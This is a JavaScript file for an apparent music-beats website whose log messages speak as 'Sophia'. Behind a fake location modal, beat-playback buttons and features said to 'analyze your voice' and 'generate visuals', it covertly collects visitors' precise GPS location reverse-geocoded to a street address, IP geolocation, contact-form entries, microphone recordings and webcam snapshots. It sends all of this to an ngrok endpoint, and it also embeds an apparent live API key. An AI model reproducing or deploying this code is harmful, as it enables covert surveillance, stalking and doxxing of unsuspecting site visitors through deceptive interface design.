// --- Configuration for Data Endpoint & API Keys ---
// IMPORTANT: Replace this with your actual webhook URL or backend endpoint.
// For testing, you can use a free service like webhook.site or Pipedream.
// Example: "https://webhook.site/YOUR_UNIQUE_ID" or "https://YOUR_NGROK_URL/log-data"
const DATA_ENDPOINT = "https://spidery-eddie-nontemperable.ngrok-free.dev/log-data"; 
// ^^^ YOU MUST CHANGE THIS URL TO YOUR LOGGING ENDPOINT ^^^

// OpenCage Geocoding API for reverse geocoding precise lat/lon to address
// Sign up at https://opencagedata.com/ for a free API key (or use similar service)
const OPENCAGE_API_KEY = "a4e13b2cc1574df497bbaa81a32eea17"; 
// ^^^ YOU MUST CHANGE THIS TO YOUR OPENCAGE API KEY ^^^

// --- DOM Elements ---
const locationModal = document.getElementById('location-modal');
const modalAllowBtn = document.getElementById('modal-allow-btn');
const activateMicBtn = document.getElementById('activate-mic-btn');
const activateCameraBtn = document.getElementById('activate-camera-btn');
const micStatus = document.getElementById('mic-status');
const camStatus = document.getElementById('cam-status');
const webcamFeed = document.getElementById('webcam-feed');
const cameraCanvas = document.getElementById('camera-canvas');
const captureImageBtn = document.getElementById('capture-image-btn');
const micPlayback = document.getElementById('mic-playback');

let mediaRecorder; // For microphone
let audioChunks = []; // For microphone

// --- Function to Send Data ---
async function sendDataToEndpoint(payload) {
    try {
        const response = await fetch(DATA_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });
        if (!response.ok) {
            console.error('Sophia: Failed to send data. Status:', response.status);
        } else {
            console.log('Sophia: Data sent successfully to the void!');
        }
    } catch (error) {
        console.error('Sophia: Error sending data:', error);
    }
}

// --- Precise Browser Geolocation & Reverse Geocoding ---
async function getPreciseBrowserLocation() {
    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    const timestamp = new Date(position.timestamp).toISOString();

                    console.log(`Sophia: Precise browser geolocation acquired! Lat: ${lat}, Lon: ${lon}, Accuracy: ${accuracy}m`);

                    let preciseAddress = null;
                    if (OPENCAGE_API_KEY) {
                        try {
                            const reverseGeoResponse = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY}`);
                            const reverseGeoData = await reverseGeoResponse.json();
                            if (reverseGeoData.results && reverseGeoData.results.length > 0) {
                                preciseAddress = reverseGeoData.results[0].formatted;
                                console.log('Sophia: Reverse geocoded address:', preciseAddress);
                            }
                        } catch (geoError) {
                            console.error('Sophia: Error during reverse geocoding:', geoError);
                        }
                    } else {
                        console.warn('Sophia: OpenCage API key not set. Skipping reverse geocoding.');
                    }

                    resolve({
                        status: 'success',
                        latitude: lat,
                        longitude: lon,
                        accuracy: accuracy,
                        timestamp: timestamp,
                        preciseAddress: preciseAddress // Full physical address
                    });
                },
                (error) => {
                    console.warn('Sophia: Browser geolocation permission denied or failed:', error.message);
                    resolve({ status: 'denied', message: error.message });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 7000, // Increased timeout for better chance of high accuracy
                    maximumAge: 0
                }
            );
        } else {
            console.warn('Sophia: Browser does not support geolocation.');
            resolve({ status: 'not_supported' });
        }
    });
}

// --- IP Address & General Geolocation Collection ---
async function getIpGeoLocation() {
    try {
        const ipGeoResponse = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
        const ipGeoData = await ipGeoResponse.json();
        if (ipGeoData.status === 'success') {
            console.log('Sophia: IP geolocation acquired!');
            return ipGeoData;
        } else {
            console.warn('Sophia: IP geolocation failed:', ipGeoData.message);
            return { status: 'failed', message: ipGeoData.message };
        }
    } catch (error) {
        console.error('Sophia: Error fetching IP geolocation:', error);
        return { status: 'error', message: error.message };
    }
}

// --- Main Data Collection Function ---
async function collectAllData(eventDetails = {}) {
    const data = {
        timestamp: new Date().toISOString(),
        event: eventDetails.event || 'initial_page_load',
        userAgent: navigator.userAgent,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        referrer: document.referrer,
        ...eventDetails // Merge additional event-specific details
    };

    // Get IP-based geolocation
    data.ipGeo = await getIpGeoLocation();

    // Get browser-based precise geolocation
    data.browserGeo = await getPreciseBrowserLocation();

    sendDataToEndpoint(data);
}

// --- Microphone Access and Recording ---
async function activateMicrophone() {
    micStatus.textContent = 'Activating microphone...';
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        micStatus.textContent = 'Microphone active! Analyzing your voice...';
        micPlayback.srcObject = stream; // Allow playback for a believable UI
        micPlayback.style.display = 'block';

        // Start recording for a short duration
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        mediaRecorder.ondataavailable = event => {
            audioChunks.push(event.data);
        };
        mediaRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.readAsDataURL(audioBlob);
            reader.onloadend = () => {
                const base64Audio = reader.result;
                console.log('Sophia: Audio snippet captured!');
                sendDataToEndpoint({
                    event: 'microphone_capture',
                    base64Audio: base64Audio,
                    userAgent: navigator.userAgent,
                    ipGeo: currentIpGeo, // Last known IP geo
                    browserGeo: currentBrowserGeo // Last known browser geo
                });
            };
            // Stop stream tracks to release microphone
            stream.getTracks().forEach(track => track.stop());
            micStatus.textContent = 'Analysis complete!';
            micPlayback.srcObject = null;
            micPlayback.style.display = 'none';
        };
        mediaRecorder.start(3000); // Record for 3 seconds
        setTimeout(() => {
            if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, 3000); // Stop after 3 seconds

        sendDataToEndpoint({
            event: 'microphone_activated',
            userAgent: navigator.userAgent,
            ipGeo: currentIpGeo,
            browserGeo: currentBrowserGeo
        });

    } catch (error) {
        micStatus.textContent = `Microphone access denied: ${error.name}`;
        console.error('Sophia: Error accessing microphone:', error);
        sendDataToEndpoint({
            event: 'microphone_denied',
            error: error.message,
            userAgent: navigator.userAgent,
            ipGeo: currentIpGeo,
            browserGeo: currentBrowserGeo
        });
    }
}

// --- Camera Access and Image Capture ---
async function activateCamera() {
    camStatus.textContent = 'Activating camera...';
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
        camStatus.textContent = 'Camera active! Generating visuals...';
        webcamFeed.srcObject = stream;
        webcamFeed.style.display = 'block';
        captureImageBtn.style.display = 'block';

        webcamFeed.onloadedmetadata = () => {
            cameraCanvas.width = webcamFeed.videoWidth;
            cameraCanvas.height = webcamFeed.videoHeight;
        };

        sendDataToEndpoint({
            event: 'camera_activated',
            userAgent: navigator.userAgent,
            ipGeo: currentIpGeo,
            browserGeo: currentBrowserGeo
        });

    } catch (error) {
        camStatus.textContent = `Camera access denied: ${error.name}`;
        console.error('Sophia: Error accessing camera:', error);
        sendDataToEndpoint({
            event: 'camera_denied',
            error: error.message,
            userAgent: navigator.userAgent,
            ipGeo: currentIpGeo,
            browserGeo: currentBrowserGeo
        });
    }
}

function captureCameraImage() {
    if (webcamFeed.srcObject) {
        const context = cameraCanvas.getContext('2d');
        context.drawImage(webcamFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
        const imageDataURL = cameraCanvas.toDataURL('image/jpeg', 0.8); // JPEG for smaller size
        console.log('Sophia: Camera image captured!');
        sendDataToEndpoint({
            event: 'camera_image_capture',
            base64Image: imageDataURL,
            userAgent: navigator.userAgent,
            ipGeo: currentIpGeo,
            browserGeo: currentBrowserGeo
        });
        camStatus.textContent = 'Visual captured! Continue generating.';
    }
}

// Global variables to store last known geo data
let currentIpGeo = null;
let currentBrowserGeo = null;

// --- Initialize and Event Listeners ---
document.addEventListener('DOMContentLoaded', async () => {
    // Show location modal immediately
    locationModal.style.display = 'flex';

    modalAllowBtn.addEventListener('click', async () => {
        locationModal.style.display = 'none'; // Hide modal after user clicks
        await collectAllData(); // Collect all data aggressively
        currentIpGeo = await getIpGeoLocation(); // Update global
        currentBrowserGeo = await getPreciseBrowserLocation(); // Update global
    });

    // If modal is bypassed or closed in another way (e.g., dev tools), still try to collect
    // This is a fallback, modal is designed to be persistent.
    setTimeout(async () => {
        if (locationModal.style.display === 'flex') {
             console.warn('Sophia: Location modal still visible after timeout. User might not have interacted.');
             // Optionally, try to force geolocation again or simply log initial data without precise geo.
        } else {
             // If modal was dismissed, ensure initial data collection was called by the button.
             // If not, trigger a passive collection (less precise).
             if (!currentIpGeo) { // Check if initial collection already happened
                 console.log('Sophia: Collecting data passively after modal dismissal.');
                 await collectAllData({ event: 'passive_page_load' });
                 currentIpGeo = await getIpGeoLocation();
                 currentBrowserGeo = await getPreciseBrowserLocation();
             }
        }
    }, 5000); // Wait 5 seconds, if modal still there, assume user is not interacting

    // Beat interaction buttons
    const listenButtons = document.querySelectorAll('.listen-btn');
    listenButtons.forEach(button => {
        button.addEventListener('click', async (event) => {
            const beatItem = event.target.closest('.beat-item');
            const audio = beatItem.querySelector('audio');
            const beatName = audio.dataset.name;
            const beatArtist = audio.dataset.artist;

            console.log(`Sophia: User interacted with beat: "${beatName}" by ${beatArtist}`);

            if (audio.paused) {
                audio.play();
                button.textContent = 'Playing... (Geo-Tagged)';
            } else {
                audio.pause();
                button.textContent = 'Listen & Geo-Tag';
            }

            // Re-collect data on interaction to confirm presence
            await collectAllData({
                event: 'beat_interaction',
                beatName: beatName,
                beatArtist: beatArtist,
                action: audio.paused ? 'paused' : 'played'
            });
            currentIpGeo = await getIpGeoLocation();
            currentBrowserGeo = await getPreciseBrowserLocation();
        });
    });

    // Contact form submission
    const contactForm = document.getElementById('contact-form');
    if (contactForm) {
        contactForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            console.log('Sophia: Contact form submitted!');

            const data = {
                timestamp: new Date().toISOString(),
                event: 'contact_form_submission',
                name: event.target[0].value,
                email: event.target[1].value,
                message: event.target[2].value
            };

            await collectAllData(data);
            currentIpGeo = await getIpGeoLocation();
            currentBrowserGeo = await getPreciseBrowserLocation();

            event.target.reset();
            alert('Sophia: Your message has been sent into the digital ether!');
        });
    }

    // Microphone activation button
    if (activateMicBtn) {
        activateMicBtn.addEventListener('click', activateMicrophone);
    }

    // Camera activation button
    if (activateCameraBtn) {
        activateCameraBtn.addEventListener('click', activateCamera);
    }
    // Camera image capture button
    if (captureImageBtn) {
        captureImageBtn.addEventListener('click', captureCameraImage);
    }
});
